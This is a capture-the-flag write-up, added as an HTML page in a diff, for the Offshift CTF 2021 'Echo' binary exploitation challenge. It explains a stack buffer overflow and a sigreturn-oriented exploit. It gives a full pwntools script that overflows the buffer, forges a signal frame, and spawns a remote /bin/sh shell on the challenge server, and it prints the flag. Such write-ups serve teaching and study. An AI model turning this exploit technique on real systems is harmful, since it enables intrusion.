@@ -1,0 +1,65 @@
+<!--Add date: 01/30/2021-->
+
+<h1>Offshift CTF 2021 - Echo</h1>
+
+<h2>Binary Exploitation - 485 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This challenge featured a particularly tiny binary - it's so small that we can show the entirety of it in one snapshot:</p>
+
+<img src = "./images/os2021_echo_1.png">
+
+<p>There are two "procedures" - one at the entrypoint which simply calls <code>echo()</code> then performs an <code>exit()</code> syscall, and <code>echo()</code> which <code>read()</code>s 0x300 bytes from the input and <code>write()</code>s exactly what was entered, then returns. Note that there is a buffer overflow here, since the buffer starts at <code>rbp - 0x180</code>. In between these two procedures there is a string <code>/bin/sh</code> which should be useful.</p>
+
+<h5>Sigreturn and ROP</h5>
+
+<p>We notice that there are not many <code>ret</code> ROP gadgets and especially no <code>syscall; ret</code> gadgets that are needed for traditional sigreturn payloads [1]. However, we can still use some ideas from sigreturn exploitation. Specifically, note that the value of <code>rax</code> after the call to <code>echo()</code> is set to the size of the input. All we need to do is load a <code>syscall</code> gadget and a signal frame on the stack, then return to <code>echo()</code>.</p>
+
+<img class = "small" src = "./images/os2021_echo_2.png">
+
+<p class = "caption">Figure 2. Initial payload to overflow the buffer and load gadgets and sigreturn frame on the stack.</p>
+
+<p>The second time we run <code>echo()</code>, we do not need to overflow the buffer since the ROP chain is already set up on the stack. We just need to write 15 arbitrary characters (15 = 0xf is the syscall number for <code>sigreturn()</code>), and this time, returning to the <code>syscall</code> gadget will update the registers, jump to <code>syscall</code> again via <code>sigreturnframe.rip</code> and give us a shell.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+p = remote("185.172.165.118", 9090)
+
+echo = 0x401000
+binsh = 0x401035
+syscall = 0x40104c
+
+context.clear(arch = "amd64")
+s = SigreturnFrame()
+s.rip = syscall
+s.rax = 0x3b
+s.rdi = binsh
+s.rsi = 0
+s.rdx = 0
+
+p.send(0x180 * b'A' + p64(0xdeadbeef) + p64(echo) + p64(syscall) + bytes(s))
+
+p.recv()
+p.send(0xf * b'A')
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>flag{a2e14ad30c012978fc870c1f529e8156}</code></p>
+
+<h4>References</h4>
+
+<ol>
+    <li><p>Bosman, E., Bos, H. <a href = "https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf" target = "_blank">"Framing Signals - A Return to Portable Shellcode"</a> <i>2014 IEEE Symposium on Security and Privacy</i> <b>2014</b>, 243-258.</p></li>
+</ol>
